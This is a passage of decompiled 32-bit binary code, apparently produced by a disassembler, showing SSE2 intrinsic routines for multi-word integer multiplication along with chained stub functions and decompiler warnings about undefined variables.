  v258 = _mm_add_epi32(_mm_unpackhi_epi64(v253, v251), _mm_srli_epi64(v257, 0x30u));
  ++v259;
  v260 = _mm_load_si128(&v330);
  v261 = _mm_load_si128(&v338);
  v262 = _mm_add_epi64(
           _mm_add_epi64(
             _mm_add_epi64(v258, _mm_mul_epu32(_mm_load_si128(&v313), v260)),
             _mm_slli_epi64(_mm_unpackhi_epi64(v254, v251), 0x10u)),
           _mm_mul_epu32(_mm_load_si128(&v305), v261));
  v263 = _mm_add_epi32(_mm_mul_epu32(v260, *v259), _mm_mul_epu32(v261, v259[-8]));
  v264 = _mm_load_si128(&v323);
  v265 = _mm_add_epi64(v262, _mm_mul_epu32(_mm_load_si128(&v320), v264));
  v266 = _mm_add_epi32(v263, _mm_mul_epu32(v264, v259[7]));
  v267 = _mm_load_si128(&v337);
  v268 = _mm_add_epi64(v265, _mm_mul_epu32(_mm_load_si128(&v306), v267));
  v269 = _mm_add_epi32(v266, _mm_mul_epu32(v267, v259[-7]));
  v270 = _mm_load_si128(&v324);
  v271 = _mm_add_epi64(v268, _mm_mul_epu32(_mm_load_si128(&v319), v270));
  v272 = _mm_add_epi32(v269, _mm_mul_epu32(v270, v259[6]));
  v273 = _mm_load_si128(&v336);
  v274 = _mm_add_epi64(v271, _mm_mul_epu32(_mm_load_si128(&v307), v273));
  v275 = _mm_add_epi32(v272, _mm_mul_epu32(v273, v259[-6]));
  v276 = _mm_load_si128(&v325);
  v277 = _mm_add_epi64(v274, _mm_mul_epu32(_mm_load_si128(&v318), v276));
  v278 = _mm_add_epi32(v275, _mm_mul_epu32(v276, v259[5]));
  v279 = _mm_load_si128(&v335);
  v280 = _mm_add_epi64(v277, _mm_mul_epu32(_mm_load_si128(&v308), v279));
  v281 = _mm_add_epi32(v278, _mm_mul_epu32(v279, v259[-5]));
  v282 = _mm_load_si128(&v326);
  v283 = _mm_add_epi64(v280, _mm_mul_epu32(_mm_load_si128(&v317), v282));
  v284 = _mm_add_epi32(v281, _mm_mul_epu32(v282, v259[4]));
  v285 = _mm_load_si128(&v334);
  v286 = _mm_add_epi64(v283, _mm_mul_epu32(_mm_load_si128(&v309), v285));
  v287 = _mm_add_epi32(v284, _mm_mul_epu32(v285, v259[-4]));
  v288 = _mm_load_si128(&v327);
  v289 = _mm_add_epi64(v286, _mm_mul_epu32(_mm_load_si128(&v316), v288));
  v290 = _mm_add_epi32(v287, _mm_mul_epu32(v288, v259[3]));
  v291 = _mm_load_si128(&v333);
  v292 = _mm_add_epi64(v289, _mm_mul_epu32(_mm_load_si128(&v310), v291));
  v293 = _mm_add_epi32(v290, _mm_mul_epu32(v291, v259[-3]));
  v294 = _mm_load_si128(&v328);
  v295 = _mm_add_epi64(v292, _mm_mul_epu32(_mm_load_si128(&v315), v294));
  v296 = _mm_add_epi32(v293, _mm_mul_epu32(v294, v259[2]));
  v297 = _mm_load_si128(&v332);
  v298 = _mm_add_epi64(v295, _mm_mul_epu32(_mm_load_si128(&v311), v297));
  v299 = _mm_add_epi32(v296, _mm_mul_epu32(v297, v259[-2]));
  v300 = _mm_load_si128(&v329);
  v301 = _mm_add_epi64(v298, _mm_mul_epu32(_mm_load_si128(&v314), v300));
  v302 = _mm_add_epi32(v299, _mm_mul_epu32(v300, v259[1]));
  v303 = _mm_load_si128(&v331);
  v304 = (__m128)_mm_add_epi32(v302, _mm_mul_epu32(v303, v259[-1]));
  *(_QWORD *)(v256 + 120) = _mm_add_epi32(
                              _mm_add_epi64(v301, _mm_mul_epu32(_mm_load_si128(&v312), v303)),
                              _mm_slli_epi64(_mm_add_epi32((__m128i)v304, (__m128i)_mm_movehl_ps(v255, v304)), 0x20u)).m128i_u64[0];
  return result;
}
// 44815B: variable 'v33' is possibly undefined
// 448192: variable 'v39' is possibly undefined
// 4481EB: variable 'v50' is possibly undefined
// 448212: variable 'v54' is possibly undefined
// 44827E: variable 'v67' is possibly undefined
// 4482B5: variable 'v73' is possibly undefined
// 44830E: variable 'v84' is possibly undefined
// 448335: variable 'v88' is possibly undefined
// 4483A1: variable 'v101' is possibly undefined
// 4483D8: variable 'v107' is possibly undefined
// 448431: variable 'v118' is possibly undefined
// 448458: variable 'v122' is possibly undefined
// 4484C4: variable 'v135' is possibly undefined
// 4484FB: variable 'v141' is possibly undefined
// 448554: variable 'v152' is possibly undefined
// 44857B: variable 'v156' is possibly undefined
// 4485E7: variable 'v169' is possibly undefined
// 44861E: variable 'v175' is possibly undefined
// 448677: variable 'v186' is possibly undefined
// 44869E: variable 'v190' is possibly undefined
// 44870A: variable 'v203' is possibly undefined
// 448741: variable 'v209' is possibly undefined
// 44879A: variable 'v220' is possibly undefined
// 4487C1: variable 'v224' is possibly undefined
// 44882D: variable 'v237' is possibly undefined
// 448864: variable 'v243' is possibly undefined
// 4488BD: variable 'v256' is possibly undefined
// 4488E4: variable 'v259' is possibly undefined
// 4BACE0: using guessed type __m128i stru_4BACE0;
// 447C80: using guessed type __m128i anonymous_27;

//----- (00447D40) --------------------------------------------------------
int sub_447D40()
{
  return sub_447D7D();
}
// 447D7D: using guessed type int sub_447D7D(void);

//----- (00447D7D) --------------------------------------------------------
int sub_447D7D()
{
  return sub_447DBA();
}
// 447DBA: using guessed type int sub_447DBA(void);

//----- (00447DBA) --------------------------------------------------------
int sub_447DBA()
{
  return sub_447DF7();
}
// 447DF7: using guessed type int sub_447DF7(void);

//----- (00447DF7) --------------------------------------------------------
int sub_447DF7()
{
  return sub_447E34();
}
// 447E34: using guessed type int sub_447E34(void);

//----- (00447E34) --------------------------------------------------------
int sub_447E34()
{
  return sub_447E71();
}
// 447E71: using guessed type int sub_447E71(void);

//----- (00447E71) --------------------------------------------------------
int sub_447E71()
{
  return sub_447EAE();
}
// 447EAE: using guessed type int sub_447EAE(void);

//----- (00447EAE) --------------------------------------------------------
int sub_447EAE()
{
  return sub_447EEB();
}
// 447EEB: using guessed type int sub_447EEB(void);

//----- (00447EEB) --------------------------------------------------------
int sub_447EEB()
{
  return sub_447F28();
}
// 447F28: using guessed type int sub_447F28(void);

//----- (00447F28) --------------------------------------------------------
int sub_447F28()
{
  return sub_447F65();
}
// 447F65: using guessed type int sub_447F65(void);

//----- (00447F65) --------------------------------------------------------
int sub_447F65()
{
  return sub_447FA2();
}
// 447FA2: using guessed type int sub_447FA2(void);

//----- (00447FA2) --------------------------------------------------------
int sub_447FA2()
{
  return sub_447FDF();
}
// 447FDF: using guessed type int sub_447FDF(void);

//----- (00447FDF) --------------------------------------------------------
int sub_447FDF()
{
  return sub_44801C();
}
// 44801C: using guessed type int sub_44801C(void);

//----- (0044801C) --------------------------------------------------------
int sub_44801C()
{
  return sub_448059();
}
// 448059: using guessed type int sub_448059(void);

//----- (00448059) --------------------------------------------------------
__m128i __usercall sub_448059@<xmm0>(int a1@<edi>, const __m128i *a2@<esi>)
{
  return _mm_srli_epi32(_mm_mul_epu32(_mm_load_si128((const __m128i *)(a1 - 16)), _mm_load_si128(a2 + 1)), 0x10u);
}

//----- (00448AC0) --------------------------------------------------------
int __cdecl sub_448AC0(int a1, int a2, int a3)
{
  int result; // eax
  int i; // edx
  __m128i v5; // xmm0
  __m128i v6; // xmm1
  __m128i v7; // xmm2
  __m128i v8; // xmm7
  __m128i v9; // xmm5
  __m128i si128; // xmm6
  __m128i v11; // xmm4
  __m128i v12; // xmm7
  __m128i v13; // xmm6
  __m128i v14; // xmm7
  __m128i v15; // xmm0
  __m128i v16; // xmm1
  __m128i v17; // xmm4
  __m128i v18; // xmm5
  __m128 v19; // xmm7
  __m128i v20; // xmm6
  __m128i v21; // xmm4
  __m128i v22; // xmm6
  __m128i v23; // xmm4
  __m128i v24; // xmm1
  __m128 v25; // xmm6
  int *v26; // [esp-4h] [ebp-80h] BYREF
  __m128i v27; // [esp+10h] [ebp-6Ch] BYREF
  __m128i v28; // [esp+20h] [ebp-5Ch] BYREF
  __m128i v29; // [esp+30h] [ebp-4Ch]
  __m128i v30; // [esp+40h] [ebp-3Ch]
  __m128i v31; // [esp+50h] [ebp-2Ch] BYREF
  __m128i v32; // [esp+60h] [ebp-1Ch] BYREF
  int v33; // [esp+70h] [ebp-Ch] BYREF

  result = a2;
  v26 = &v33;
  for ( i = 0; i != 16; i += 16 )
  {
    v5 = _mm_shuffle_epi32(*(__m128i *)(a2 + i), 216);
    v6 = _mm_shuffle_epi32(*(__m128i *)(a2 + i), 141);
    v7 = _mm_shuffle_epi32(*(__m128i *)(a3 + i), 216);
    *(__m128i *)((char *)&v27 + 2 * i) = v5;
    *(__m128i *)((char *)&v28 + 2 * i) = _mm_srli_epi64(v5, 0x20u);
    *(__m128i *)((char *)&v29 + 2 * i) = v6;
    *(__m128i *)((char *)&v30 + 2 * i) = _mm_srli_epi64(v6, 0x20u);
    *(__m128i *)((char *)&v31 + 2 * i) = v7;
    *(__m128i *)((char *)&v32 + 2 * i) = _mm_srli_epi64(v7, 0x20u);
  }
  v8 = _mm_load_si128(&v31);
  v9 = _mm_mul_epu32(_mm_load_si128(&v27), v8);
  si128 = _mm_load_si128(&stru_4BACE0);
  v11 = _mm_and_si128(si128, v9);
  v12 = _mm_mul_epu32(v8, v29);
  v13 = _mm_and_si128(si128, v12);
  v14 = _mm_srli_epi32(v12, 0x10u);
  v15 = _mm_move_epi64(v13);
  v16 = _mm_move_epi64(v14);
  v17 = _mm_add_epi32(v11, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v13, v15), v15), 4));
  v18 = _mm_add_epi32(_mm_srli_epi32(v9, 0x10u), _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v14, v16), v16), 4));
  v19 = (__m128)_mm_move_epi64(v18);
  *(_DWORD *)a1 = _mm_cvtsi128_si32(v17);
  v20 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v17), 0x10u), (__m128i)v19);
  *(_QWORD *)(a1 + 2) = v20.m128i_i64[0];
  v21 = _mm_add_epi32(_mm_unpackhi_epi64(v17, v15), _mm_srli_epi64(v20, 0x30u));
  v22 = _mm_load_si128(&v31);
  v23 = _mm_add_epi64(
          _mm_add_epi64(v21, _mm_mul_epu32(_mm_load_si128(&v28), v22)),
          _mm_slli_epi64(_mm_unpackhi_epi64(v18, v15), 0x10u));
  v24 = _mm_load_si128(&v32);
  v25 = (__m128)_mm_add_epi32(_mm_mul_epu32(v22, v30), _mm_mul_epu32(v24, v29));
  *(_QWORD *)(a1 + 8) = _mm_add_epi32(
                          _mm_add_epi64(v23, _mm_mul_epu32(_mm_load_si128((const __m128i *)(&v26 + 5)), v24)),
                          _mm_slli_epi64(_mm_add_epi32((__m128i)v25, (__m128i)_mm_movehl_ps(v19, v25)), 0x20u)).m128i_u64[0];
  return result;
}
// 4BACE0: using guessed type __m128i stru_4BACE0;

//----- (00448C20) --------------------------------------------------------
int __cdecl sub_448C20(int a1, int a2, int a3)
{
  unsigned int i; // edx
  __m128i v4; // xmm0
  __m128i v5; // xmm1
  __m128i v6; // xmm2
  __m128i v7; // xmm7
  __m128i v8; // xmm5
  __m128i si128; // xmm6
  __m128i v10; // xmm4
  __m128i v11; // xmm7
  __m128i v12; // xmm6
  __m128i v13; // xmm7
  __m128i v14; // xmm0
  __m128i v15; // xmm1
  __m128i v16; // xmm4
  __m128i v17; // xmm5
  __m128i v18; // xmm6
  __m128i v19; // xmm5
  __m128i v20; // xmm4
  __m128i v21; // xmm7
  __m128i v22; // xmm0
  __m128i v23; // xmm7
  __m128i v24; // xmm6
  __m128i v25; // xmm4
  __m128i v26; // xmm5
  __m128i v27; // xmm6
  __m128i v28; // xmm7
  __m128i v29; // xmm0
  __m128i v30; // xmm1
  __m128i v31; // xmm4
  __m128i v32; // xmm5
  int v33; // ecx
  __m128i v34; // xmm6
  __m128i v35; // xmm5
  __m128i v36; // xmm4
  __m128i v37; // xmm7
  __m128i v38; // xmm0
  __m128i *v39; // edx
  __m128i v40; // xmm7
  __m128i v41; // xmm6
  __m128i v42; // xmm4
  __m128i v43; // xmm5
  __m128i v44; // xmm6
  __m128i v45; // xmm7
  int result; // eax
  __m128i v47; // xmm0
  __m128i v48; // xmm1
  __m128i v49; // xmm4
  __m128i v50; // xmm5
  __m128 v51; // xmm7
  int v52; // ecx
  __m128i v53; // xmm6
  __m128i v54; // xmm4
  __m128i *v55; // edx
  __m128i v56; // xmm6
  __m128i v57; // xmm1
  __m128i v58; // xmm4
  __m128i v59; // xmm6
  __m128i v60; // xmm1
  __m128i v61; // xmm4
  __m128i v62; // xmm6
  __m128i v63; // xmm1
  __m128 v64; // xmm6
  __m128i v65; // [esp+10h] [ebp-CCh] BYREF
  __m128i v66; // [esp+20h] [ebp-BCh] BYREF
  __m128i v67; // [esp+30h] [ebp-ACh] BYREF
  __m128i v68; // [esp+40h] [ebp-9Ch] BYREF
  __m128i v69; // [esp+50h] [ebp-8Ch]
  __m128i v70[3]; // [esp+60h] [ebp-7Ch]
  __m128i v71; // [esp+90h] [ebp-4Ch] BYREF
  __m128i v72; // [esp+A0h] [ebp-3Ch] BYREF
  __m128i v73; // [esp+B0h] [ebp-2Ch] BYREF
  __m128i v74; // [esp+C0h] [ebp-1Ch] BYREF

  for ( i = 0; i != 32; i += 16 )
  {
    v4 = _mm_shuffle_epi32(*(__m128i *)(a2 + i), 216);
    v5 = _mm_shuffle_epi32(*(__m128i *)(a2 + i), 141);
    v6 = _mm_shuffle_epi32(*(__m128i *)(a3 + i), 216);
    *(__m128i *)((char *)&v65 + 2 * i) = v4;
    *(__m128i *)((char *)&v66 + 2 * i) = _mm_srli_epi64(v4, 0x20u);
    *(__m128i *)((char *)&v69 + 2 * i) = v5;
    v70[i / 8] = _mm_srli_epi64(v5, 0x20u);
    *(__m128i *)((char *)&v71 + 2 * i) = v6;
    *(__m128i *)((char *)&v72 + 2 * i) = _mm_srli_epi64(v6, 0x20u);
  }
  v7 = _mm_load_si128(&v71);
  v8 = _mm_mul_epu32(_mm_load_si128(&v65), v7);
  si128 = _mm_load_si128(&stru_4BACE0);
  v10 = _mm_and_si128(si128, v8);
  v11 = _mm_mul_epu32(v7, v69);
  v12 = _mm_and_si128(si128, v11);
  v13 = _mm_srli_epi32(v11, 0x10u);
  v14 = _mm_move_epi64(v12);
  v15 = _mm_move_epi64(v13);
  v16 = _mm_add_epi32(v10, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v12, v14), v14), 4));
  v17 = _mm_add_epi32(_mm_srli_epi32(v8, 0x10u), _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v13, v15), v15), 4));
  *(_DWORD *)a1 = _mm_cvtsi128_si32(v16);
  v18 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v16), 0x10u), _mm_move_epi64(v17));
  v19 = _mm_unpackhi_epi64(v17, v14);
  *(_QWORD *)(a1 + 2) = v18.m128i_i64[0];
  v20 = _mm_add_epi32(_mm_unpackhi_epi64(v16, v14), _mm_srli_epi64(v18, 0x30u));
  v21 = _mm_load_si128(&v71);
  v22 = _mm_mul_epu32(_mm_load_si128(&v66), v21);
  v23 = _mm_mul_epu32(v21, v70[0]);
  v24 = _mm_load_si128(&stru_4BACE0);
  v25 = _mm_add_epi32(v20, _mm_and_si128(v24, v22));
  v26 = _mm_add_epi32(v19, _mm_srli_epi32(v22, 0x10u));
  v27 = _mm_and_si128(v24, v23);
  v28 = _mm_srli_epi32(v23, 0x10u);
  sub_448D0E((int)&v66, &v71);
  v29 = _mm_move_epi64(v27);
  v30 = _mm_move_epi64(v28);
  v31 = _mm_add_epi32(v25, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v27, v29), v29), 4));
  v32 = _mm_add_epi32(v26, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v28, v30), v30), 4));
  *(_DWORD *)(v33 + 8) = _mm_cvtsi128_si32(v31);
  v34 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v31), 0x10u), _mm_move_epi64(v32));
  v35 = _mm_unpackhi_epi64(v32, v29);
  *(_QWORD *)(v33 + 10) = v34.m128i_i64[0];
  v36 = _mm_add_epi32(_mm_unpackhi_epi64(v31, v29), _mm_srli_epi64(v34, 0x30u));
  v37 = _mm_load_si128(&v72);
  v38 = _mm_mul_epu32(_mm_load_si128(&v66), v37);
  v40 = _mm_mul_epu32(v37, *v39);
  v41 = _mm_load_si128(&stru_4BACE0);
  v42 = _mm_add_epi32(v36, _mm_and_si128(v41, v38));
  v43 = _mm_add_epi32(v35, _mm_srli_epi32(v38, 0x10u));
  v44 = _mm_and_si128(v41, v40);
  v45 = _mm_srli_epi32(v40, 0x10u);
  result = sub_448CD1();
  v47 = _mm_move_epi64(v44);
  v48 = _mm_move_epi64(v45);
  v49 = _mm_add_epi32(v42, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v44, v47), v47), 4));
  v50 = _mm_add_epi32(v43, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v45, v48), v48), 4));
  v51 = (__m128)_mm_move_epi64(v50);
  *(_DWORD *)(v52 + 16) = _mm_cvtsi128_si32(v49);
  v53 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v49), 0x10u), (__m128i)v51);
  *(_QWORD *)(v52 + 18) = v53.m128i_i64[0];
  v54 = _mm_add_epi32(_mm_unpackhi_epi64(v49, v47), _mm_srli_epi64(v53, 0x30u));
  ++v55;
  v56 = _mm_load_si128(&v72);
  v57 = _mm_load_si128(&v74);
  v58 = _mm_add_epi64(
          _mm_add_epi64(
            _mm_add_epi64(v54, _mm_mul_epu32(_mm_load_si128(&v67), v56)),
            _mm_slli_epi64(_mm_unpackhi_epi64(v50, v47), 0x10u)),
          _mm_mul_epu32(_mm_load_si128(&v65), v57));
  v59 = _mm_add_epi32(_mm_mul_epu32(v56, *v55), _mm_mul_epu32(v57, v55[-2]));
  v60 = _mm_load_si128(&v71);
  v61 = _mm_add_epi64(v58, _mm_mul_epu32(_mm_load_si128(&v68), v60));
  v62 = _mm_add_epi32(v59, _mm_mul_epu32(v60, v55[1]));
  v63 = _mm_load_si128(&v73);
  v64 = (__m128)_mm_add_epi32(v62, _mm_mul_epu32(v63, v55[-1]));
  *(_QWORD *)(v52 + 24) = _mm_add_epi32(
                            _mm_add_epi64(v61, _mm_mul_epu32(_mm_load_si128(&v66), v63)),
                            _mm_slli_epi64(_mm_add_epi32((__m128i)v64, (__m128i)_mm_movehl_ps(v51, v64)), 0x20u)).m128i_u64[0];
  return result;
}
// 448E10: variable 'v33' is possibly undefined
// 448E47: variable 'v39' is possibly undefined
// 448EA0: variable 'v52' is possibly undefined
// 448EC7: variable 'v55' is possibly undefined
// 4BACE0: using guessed type __m128i stru_4BACE0;
// 448C20: using guessed type __m128i anonymous_3;

//----- (00448CD1) --------------------------------------------------------
int sub_448CD1()
{
  return sub_448D0E();
}
// 448D0E: using guessed type int sub_448D0E(void);

//----- (00448D0E) --------------------------------------------------------
__m128i __usercall sub_448D0E@<xmm0>(int a1@<edi>, const __m128i *a2@<esi>)
{
  return _mm_srli_epi32(_mm_mul_epu32(_mm_load_si128((const __m128i *)(a1 - 16)), _mm_load_si128(a2 + 1)), 0x10u);
}

//----- (00448F60) --------------------------------------------------------
void __cdecl sub_448F60(int a1, int a2, int a3)
{
  unsigned int i; // edx
  __m128i v4; // xmm0
  __m128i v5; // xmm1
  __m128i v6; // xmm2
  __m128i v7; // xmm7
  __m128i v8; // xmm0
  __m128i v9; // xmm7
  __m128i si128; // xmm6
  __m128i v11; // xmm4
  __m128i v12; // xmm5
  __m128i v13; // xmm6
  __m128i v14; // xmm7
  __m128i v15; // xmm0
  __m128i v16; // xmm1
  __m128i v17; // xmm4
  __m128i v18; // xmm5
  int v19; // ecx
  __m128i v20; // xmm6
  __m128i v21; // xmm5
  __m128i v22; // xmm4
  __m128i v23; // xmm7
  __m128i v24; // xmm0
  __m128i *v25; // edx
  __m128i v26; // xmm7
  __m128i v27; // xmm6
  __m128i v28; // xmm4
  __m128i v29; // xmm5
  __m128i v30; // xmm6
  __m128i v31; // xmm7
  unsigned int v32; // eax
  int v33; // ecx
  __m128i v34; // xmm0
  __m128i v35; // xmm1
  __m128i v36; // xmm4
  __m128i v37; // xmm5
  __m128i v38; // xmm6
  __m128i v39; // xmm5
  __m128i v40; // xmm4
  __m128i *v41; // edx
  __m128i v42; // xmm7
  __m128i v43; // xmm0
  __m128i v44; // xmm7
  __m128i v45; // xmm6
  __m128i v46; // xmm4
  __m128i v47; // xmm5
  __m128i v48; // xmm6
  __m128i v49; // xmm7
  __m128i v50; // xmm0
  __m128i v51; // xmm1
  __m128i v52; // xmm4
  __m128i v53; // xmm5
  int v54; // ecx
  __m128i v55; // xmm6
  __m128i v56; // xmm5
  __m128i v57; // xmm4
  __m128i v58; // xmm7
  __m128i v59; // xmm0
  __m128i *v60; // edx
  __m128i v61; // xmm7
  __m128i v62; // xmm6
  __m128i v63; // xmm4
  __m128i v64; // xmm5
  __m128i v65; // xmm6
  __m128i v66; // xmm7
  __m128i v67; // xmm0
  __m128i v68; // xmm1
  __m128i v69; // xmm4
  __m128i v70; // xmm5
  int v71; // ecx
  __m128i v72; // xmm6
  __m128i v73; // xmm5
  __m128i v74; // xmm4
  __m128i *v75; // edx
  __m128i v76; // xmm7
  __m128i v77; // xmm0
  __m128i v78; // xmm7
  __m128i v79; // xmm6
  __m128i v80; // xmm4
  __m128i v81; // xmm5
  __m128i v82; // xmm6
  __m128i v83; // xmm7
  __m128i v84; // xmm0
  __m128i v85; // xmm1
  __m128i v86; // xmm4
  __m128i v87; // xmm5
  int v88; // ecx
  __m128i v89; // xmm6
  __m128i v90; // xmm5
  __m128i v91; // xmm4
  __m128i v92; // xmm7
  __m128i v93; // xmm0
  __m128i *v94; // edx
  __m128i v95; // xmm7
  __m128i v96; // xmm6
  __m128i v97; // xmm4
  __m128i v98; // xmm5
  __m128i v99; // xmm6
  __m128i v100; // xmm7
  __m128i v101; // xmm0
  __m128i v102; // xmm1
  __m128i v103; // xmm4
  __m128i v104; // xmm5
  int v105; // ecx
  __m128i v106; // xmm6
  __m128i v107; // xmm5
  __m128i v108; // xmm4
  __m128i *v109; // edx
  __m128i v110; // xmm7
  __m128i v111; // xmm0
  __m128i v112; // xmm7
  __m128i v113; // xmm6
  __m128i v114; // xmm4
  __m128i v115; // xmm5
  __m128i v116; // xmm6
  __m128i v117; // xmm7
  __m128i v118; // xmm0
  __m128i v119; // xmm1
  __m128i v120; // xmm4
  __m128i v121; // xmm5
  int v122; // ecx
  __m128i v123; // xmm6
  __m128i v124; // xmm5
  __m128i v125; // xmm4
  __m128i v126; // xmm7
  __m128i v127; // xmm0
  __m128i *v128; // edx
  __m128i v129; // xmm7
  __m128i v130; // xmm6
  __m128i v131; // xmm2
  __m128i v132; // xmm5
  __m128i v133; // xmm6
  __m128i v134; // xmm7
  __m128i v135; // xmm0
  __m128i v136; // xmm1
  __m128i v137; // xmm4
  __m128i v138; // xmm5
  __m128i v139; // xmm6
  _DWORD v140[17]; // [esp-4h] [ebp-1A0h] BYREF
  __m128i v141; // [esp+50h] [ebp-14Ch] BYREF
  __m128i v142; // [esp+60h] [ebp-13Ch] BYREF
  __m128i v143; // [esp+70h] [ebp-12Ch] BYREF
  __m128i v144; // [esp+80h] [ebp-11Ch] BYREF
  __m128i v145; // [esp+90h] [ebp-10Ch]
  __m128i v146[3]; // [esp+A0h] [ebp-FCh]
  __m128i v147; // [esp+D0h] [ebp-CCh]
  __m128i v148; // [esp+E0h] [ebp-BCh]
  __m128i v149; // [esp+F0h] [ebp-ACh]
  __int128 v150[3]; // [esp+110h] [ebp-8Ch]
  __m128i v151; // [esp+140h] [ebp-5Ch] BYREF
  __m128i v152; // [esp+150h] [ebp-4Ch] BYREF
  __m128i v153; // [esp+160h] [ebp-3Ch] BYREF
  __m128i v154; // [esp+170h] [ebp-2Ch] BYREF
  __m128i v155; // [esp+180h] [ebp-1Ch] BYREF
  int v156; // [esp+190h] [ebp-Ch] BYREF

  v140[0] = &v156;
  for ( i = 0; i != 64; i += 16 )
  {
    v4 = _mm_shuffle_epi32(*(__m128i *)(a2 + i), 216);
    v5 = _mm_shuffle_epi32(*(__m128i *)(a2 + i), 141);
    v6 = _mm_shuffle_epi32(*(__m128i *)(a3 + i), 216);
    *(__m128i *)&v140[i / 2 + 5] = v4;
    *(__m128i *)&v140[i / 2 + 9] = _mm_srli_epi64(v4, 0x20u);
    *(__m128i *)((char *)&v145 + 2 * i) = v5;
    v146[i / 8] = _mm_srli_epi64(v5, 0x20u);
    v150[i / 8] = (__int128)v6;
    v150[i / 8 + 1] = (__int128)_mm_srli_epi64(v6, 0x20u);
  }
  v7 = _mm_load_si128(&v151);
  v8 = _mm_mul_epu32(_mm_load_si128(&v141), v7);
  v9 = _mm_mul_epu32(v7, v147);
  si128 = _mm_load_si128(&stru_4BACE0);
  v11 = _mm_add_epi32((__m128i)0i64, _mm_and_si128(si128, v8));
  v12 = _mm_add_epi32(
          _mm_slli_epi64(
            _mm_add_epi32(
              _mm_add_epi32(
                _mm_add_epi32(
                  _mm_add_epi32(
                    _mm_add_epi32(
                      _mm_add_epi32(
                        _mm_add_epi32(
                          (__m128i)0i64,
                          _mm_srli_epi64(_mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v140[71]), v149), 0x30u)),
                        _mm_srli_epi64(_mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v154.m128i_i8[8]), v145), 0x30u)),
                      _mm_srli_epi64(_mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v140[75]), v148), 0x30u)),
                    _mm_srli_epi64(_mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v153.m128i_i8[8]), v146[0]), 0x30u)),
                  _mm_srli_epi64(_mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v140[79]), v147), 0x30u)),
                _mm_srli_epi64(_mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v152.m128i_i8[8]), v146[1]), 0x30u)),
              _mm_srli_epi64(_mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v151.m128i_i8[8]), v146[2]), 0x30u)),
            0x20u),
          _mm_srli_epi32(v8, 0x10u));
  v13 = _mm_and_si128(si128, v9);
  v14 = _mm_srli_epi32(v9, 0x10u);
  sub_449084();
  v15 = _mm_move_epi64(v13);
  v16 = _mm_move_epi64(v14);
  v17 = _mm_add_epi32(v11, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v13, v15), v15), 4));
  v18 = _mm_add_epi32(v12, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v14, v16), v16), 4));
  *(_DWORD *)v19 = _mm_cvtsi128_si32(v17);
  v20 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v17), 0x10u), _mm_move_epi64(v18));
  v21 = _mm_unpackhi_epi64(v18, v15);
  *(_QWORD *)(v19 + 2) = v20.m128i_i64[0];
  v22 = _mm_add_epi32(_mm_unpackhi_epi64(v17, v15), _mm_srli_epi64(v20, 0x30u));
  v23 = _mm_load_si128(&v152);
  v24 = _mm_mul_epu32(_mm_load_si128(&v141), v23);
  v26 = _mm_mul_epu32(v23, *v25);
  v27 = _mm_load_si128(&stru_4BACE0);
  v28 = _mm_add_epi32(v22, _mm_and_si128(v27, v24));
  v29 = _mm_add_epi32(v21, _mm_srli_epi32(v24, 0x10u));
  v30 = _mm_and_si128(v27, v26);
  v31 = _mm_srli_epi32(v26, 0x10u);
  v32 = sub_4490C1();
  v34 = _mm_move_epi64(v30);
  v35 = _mm_move_epi64(v31);
  v36 = _mm_add_epi32(
          _mm_add_epi32(
            v28,
            _mm_srli_epi32(
              _mm_cmpgt_epi32(
                _mm_srli_epi32(_mm_cvtsi32_si128(*(_DWORD *)(v33 + 4)), 0x10u),
                _mm_cvtsi32_si128(HIWORD(v32))),
              0x1Fu)),
          _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v30, v34), v34), 4));
  v37 = _mm_add_epi32(v29, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v31, v35), v35), 4));
  *(_DWORD *)v33 = _mm_cvtsi128_si32(v36);
  v38 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v36), 0x10u), _mm_move_epi64(v37));
  v39 = _mm_unpackhi_epi64(v37, v34);
  *(_QWORD *)(v33 + 2) = v38.m128i_i64[0];
  v40 = _mm_add_epi32(_mm_unpackhi_epi64(v36, v34), _mm_srli_epi64(v38, 0x30u));
  v42 = _mm_load_si128(&v152);
  v43 = _mm_mul_epu32(_mm_load_si128(&v142), v42);
  v44 = _mm_mul_epu32(v42, v41[1]);
  v45 = _mm_load_si128(&stru_4BACE0);
  v46 = _mm_add_epi32(v40, _mm_and_si128(v45, v43));
  v47 = _mm_add_epi32(v39, _mm_srli_epi32(v43, 0x10u));
  v48 = _mm_and_si128(v45, v44);
  v49 = _mm_srli_epi32(v44, 0x10u);
  sub_4490FE();
  v50 = _mm_move_epi64(v48);
  v51 = _mm_move_epi64(v49);
  v52 = _mm_add_epi32(v46, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v48, v50), v50), 4));
  v53 = _mm_add_epi32(v47, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v49, v51), v51), 4));
  *(_DWORD *)(v54 + 8) = _mm_cvtsi128_si32(v52);
  v55 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v52), 0x10u), _mm_move_epi64(v53));
  v56 = _mm_unpackhi_epi64(v53, v50);
  *(_QWORD *)(v54 + 10) = v55.m128i_i64[0];
  v57 = _mm_add_epi32(_mm_unpackhi_epi64(v52, v50), _mm_srli_epi64(v55, 0x30u));
